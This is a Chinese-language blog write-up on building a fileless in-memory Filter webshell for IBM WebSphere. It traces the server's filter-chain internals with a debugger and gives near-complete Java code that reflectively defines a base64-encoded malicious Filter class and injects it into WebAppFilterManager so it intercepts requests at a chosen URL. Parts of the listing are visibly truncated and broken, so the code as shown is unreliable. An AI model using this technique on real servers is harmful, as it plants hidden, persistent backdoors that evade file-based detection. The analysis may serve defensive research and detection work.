# WebSphere内存马分析
## 目录
  * 环境部署
  * 分析Filter
  * 编写内存马
    * 1、获取到WebAppFilterManager对象
    * 2、实例化恶意Filter相关的FilterChainContents......
    * 3、实例化恶意Filter相关的FilterInstanceWrapper......
    * 4、完整代码
  * 后话
## 环境部署
docker部署环境
    docker pull ibmcom/websphere-traditional
    docker run --name websphere -h websphere -e UPDATE_HOME=true -p 9043:9043  -p 9443:9443 -p 7777:7777 --restart=always -d ibmcom/websphere-traditional
    docker exec -it websphere cat /tmp/PASSWORD
    9043端口
    9443端口
    7777端口
    /tmp/PASSWORD:控制台登录密码，账号:wsadmin
    登录后台: https://ip:9043/ibm/console
进入后台  
设置websphere为Debug模式  
绑定端口  
编写DemoFilter和DemoServlet，配置项目的web.xml  
            TestFilter
            TestFilter
            TestFilter
            /test
            TestServlet
            TestServlet
            TestServlet
            /test
生成war包  
将war包导入服务器中  
## 分析Filter
在Servlet 中打下断点，观察调用栈，通过调用栈观察是哪里调用了TestFilter.  
`com.ibm.ws.webcontainer.filter.FilterInstanceWrapper`中调用了TestFilter  
而`this._filterInstance`是构造方法`FilterInstanceWrapper`传入的参数获取的。那么观察哪里实例化了一个`FilterInstanceWrapper`对象。  
继续观察调用栈，可以看到在`com.ibm.ws.webcontainer.filter.WebAppFilterChain`中通过`(FilterInstanceWrapper)this._filters.get(this._currentFilterIndex)`实例化`FilterInstanceWrapper`，那么继续观察`this._filters`是如何生成的。  
在`com.ibm.ws.webcontainer.filter.WebAppFilterChain`中看到`_filters为new
ArrayList()`。  
并且在`com.ibm.ws.webcontainer.filter.WebAppFilterChain`中看到`addFilter`方法，该方法中调用了`this._filters.add(fiw)`，其中`fiw为FilterInstanceWrapper类型`在这个地方打下断点，重新调试，观察哪里调用了该方法，了解是怎么生成`WebAppFilterChain._filters`。  
在`com.ibm.ws.webcontainer.filter.WebAppFilterManager`中的`getFilterChain()`方法，调用了`WebAppFilterChain`的`addFilter`。  
关注该方法中的以下代码。  
    newChain.addFilter(this.getFilterInstanceWrapper((String)filterNames.get(i)));
其中`this.getFilterInstanceWrapper((String)filterNames.get(i))`。
这里有两个需要关注的地方，`this.getFilterInstanceWrapper()`和`(String)filterNames.get(i)`。
首先是`(String)filterNames.get(i)`。可以看到其实`filternames`实际上来自于`this.getFilterChainContents`  
跟进`getFilterChainContents`观察，可以看到`fcc`来自于`com.ibm.ws.webcontainer.filter.WebAppFilterManager`对象中的`chainCache变量`  
接着是`this.getFilterInstanceWrapper()`，这里就是`com.ibm.ws.webcontainer.filter.WebAppFilterManager::getFilterInstanceWrapper()`
通过`filtername`来获取当前`WebAppFilterManager对象`中的`FilterInstanceWrapper对象`。  
构造内存马的思路：
1、获取到`WebAppFilterManager`对象
2、实例化恶意Filter相关的FilterChainContents，添加到`WebAppFilterManager.chainCache`
3、实例化恶意Filter相关的FilterInstanceWrapper，添加到`WebAppFilterManager._filterWrappers`
## 编写内存马
### 1、获取到`WebAppFilterManager`对象
在当前线程中寻找上下文。  
从当前线程中获取`currentThreadsIExtendedRequest`，通过调用`getServletContext()`，获取上下文。在上下文中可以获取到当前线程的`WebAppFilterManager`对象`filterManager`。
    private static WebAppImpl context;
        private static synchronized void GetWebContent() throws Exception{
            try {
                Object[] wsThreadLocals = (Object[]) GetField(Thread.currentThread(),"wsThreadLocals");
                for (int i = 0; i ) GetField(filterManager,"chainCache");
                    Constructor constructor = Class.forName("com.ibm.ws.webcontainer.filter.FilterChainContents").getDeclaredConstructor();
                    constructor.setAccessible(true);
                    Object filterChainContents = constructor.newInstance();
                    //Step1
                    ArrayList _filterNames= (ArrayList) GetField(filterChainContents,"_filterNames");
                    _filterNames.add(filterName);
                    SetField(filterChainContents,"_hasFilters",true);
                    chainCache.put(url,filterChainContents);
### 3、实例化恶意Filter相关的FilterInstanceWrapper......
对照TestFilter的FilterInstanceWrapper，构造`恶意Filter相关的FilterInstanceWrapper`。  
从当前filterManager对象中获取到`_filterWrappers`，直接通过`New
FilterInstanceWrapper()`实例化一个新的`FilterInstanceWrapper`。  
这里有几个我认为需要注意的地方。
1、实例化FilterInstanceWrapper时，需要传入的参数为`ManagedObject类型`  
而在早版本的websphere中是filter类型的参数  
所以这里需要进行一个类型转换。  
2、_filtersDefined设置为true的原因是因为这里对_filtersDefined进行判断。  
3、_filterState 设置为 2 的原因是因为这里对`_filterState==2`进行校验了  
### 4、完整代码
为了方便调试，直接在Sevlet的Get请求中编写内存马加载过程。
    import com.ibm.ws.managedobject.ManagedObject;
    import com.ibm.ws.managedobject.ManagedObjectContext;
    import com.ibm.ws.webcontainer.cdi.WCManagedObject;
    import com.ibm.ws.webcontainer.filter.FilterConfig;
    import com.ibm.ws.webcontainer.filter.FilterInstanceWrapper;
    import com.ibm.ws.webcontainer.filter.WebAppFilterManagerImpl;
    import com.ibm.ws.webcontainer.srt.SRTServletRequest;
    import com.ibm.ws.webcontainer.webapp.WebAppEventSource;
    import com.ibm.ws.webcontainer.webapp.WebAppImpl;
    import com.ibm.wsspi.webcontainer.webapp.WebAppConfig;
    import sun.misc.BASE64Decoder;
    import javax.servlet.*;
    import javax.servlet.http.HttpServlet;
    import javax.servlet.http.HttpServletRequest;
    import javax.servlet.http.HttpServletResponse;
    import java.io.IOException;
    import java.lang.reflect.Constructor;
    import java.lang.reflect.Field;
    import java.lang.reflect.Method;
    import java.util.*;
    public class TestServlet extends HttpServlet {
        @Override
        public void init(ServletConfig servletConfig) throws ServletException {
        }
        private static String filterName = "HFilter";
        private static String filterClassName = "com.sso.HFilter";
        private static String url = "/ccc";
        private static SRTServletRequest currentThreadsIExtendedRequest = null;
        private static WebAppImpl context;
        private static WebAppFilterManagerImpl filterManager= null;
        private static Map chainCache = null;
        private static Hashtable _filterWrappers;
        @Override
        protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
            resp.getWriter().println("This is Http");
            try {
                LoadFilter();
                GetWebContent();
                InjectFilter();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        private static synchronized void LoadFilter() throws Exception {
            try{
                Thread.currentThread().getContextClassLoader().loadClass(filterClassName).newInstance();
            }catch (Exception e){
                Method a = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
                a.setAccessible(true);
                byte[] b = (new BASE64Decoder()).decodeBuffer("恶意Filter.class | base64");
                a.invoke(Thread.currentThread().getContextClassLoader(), b, 0, b.length);
            }
        }
        private static synchronized void GetWebContent() throws Exception{
            try {
                Object[] wsThreadLocals = (Object[]) GetField(Thread.currentThread(),"wsThreadLocals");
                for (int i = 0; i ) GetField(filterManager,"chainCache");
                    Constructor constructor = Class.forName("com.ibm.ws.webcontainer.filter.FilterChainContents").getDeclaredConstructor();
                    constructor.setAccessible(true);
                    Object filterChainContents = constructor.newInstance();
                    //Step1
                    ArrayList _filterNames= (ArrayList) GetField(filterChainContents,"_filterNames");
                    _filterNames.add(filterName);
                    SetField(filterChainContents,"_hasFilters",true);
                    chainCache.put(url,filterChainContents);
                    //Step2
                    _filterWrappers = (Hashtable) GetField(filterManager,"_filterWrappers");
                    javax.servlet.Filter filter =  (Filter) Thread.currentThread().getContextClassLoader().loadClass(filterClassName).newInstance();
                    WebAppEventSource _evtSource = (WebAppEventSource) GetField(filterManager,"_evtSource");
                    ManagedObject filterMo = context.createManagedObject(filter);
                    FilterInstanceWrapper filterInstanceWrapper = new FilterInstanceWrapper(filterName,filterMo,_evtSource);
                    SetField(filterInstanceWrapper,"_filterState",2);
                    Object webAppConfig = GetField(filterManager,"webAppConfig");
                    FilterConfig filterConfig = new FilterConfig(filterName,(WebAppConfig) webAppConfig);
                    HashSet set = new HashSet();
                    set.add(DispatcherType.REQUEST);
                    filterConfig.addMappingForUrlPatterns(EnumSet.of(DispatcherType.REQUEST),true,url);
                    SetField(filterInstanceWrapper,"_filterConfig",filterConfig);
                    _filterWrappers.put(filterName,filterInstanceWrapper);
                    SetField(filterManager,"_filtersDefined",true);
                    System.out.println("123");
                }
            }catch (Exception e){
                e.printStackTrace();
            }
        }
        private static synchronized void SetField(Object o, String k,Object v) throws Exception{
            Field f;
            try{
                f = o.getClass().getDeclaredField(k);
            }catch (NoSuchFieldException e){
                f = o.getClass().getSuperclass().getDeclaredField(k);
            }catch (Exception e1){
                f = o.getClass().getSuperclass().getSuperclass().getDeclaredField(k);
            }
            f.setAccessible(true);
            f.set(o,v);
        }
        @Override
        public void destroy() {
        }
    }
## 后话
如分析有不对之处，望斧正~~